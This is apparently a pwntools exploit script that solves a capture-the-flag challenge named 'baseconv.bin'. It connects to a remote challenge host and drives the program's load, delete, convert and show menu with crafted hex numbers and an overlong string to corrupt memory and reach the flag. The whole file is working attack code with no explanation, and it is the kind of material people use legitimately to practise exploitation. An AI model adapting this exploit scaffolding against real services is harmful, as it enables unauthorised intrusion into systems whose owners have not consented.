from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./baseconv.bin"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("host5.metaproblems.com", 7524)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))

nums = 0x4060
payload = b""
# io.sendline(payload)

def verify_flag():
    io.sendlineafter(" > ", "V")

def load(base, num):
    io.sendlineafter(" > ", "L")
    io.sendlineafter("base:", str(base))
    io.sendlineafter("number: ", str(num))

def show():
    io.sendlineafter(" > ", "S")

def delete(idx):
    io.sendlineafter(" > ", "D")
    io.sendlineafter("number: ", str(idx))

def convert(idx):
    io.sendlineafter(" > ", "C")
    io.sendlineafter("number: ", str(idx))

"""
>>> hex(10000000000000001)
'0x2386f26fc10001'
"""
ddebug("break delete_number\n continue")
load(16, "2386f26fc10001")
load(16, "2386f26fc10001")
load(16, "2386f26fc10001")
load(16, "2386f26fc10001")
load(16, "2386f26fc10001")
convert(0)
delete(1)
load(16, "a"*17)
delete(2)
show()
verify_flag()

show()

io.interactive()
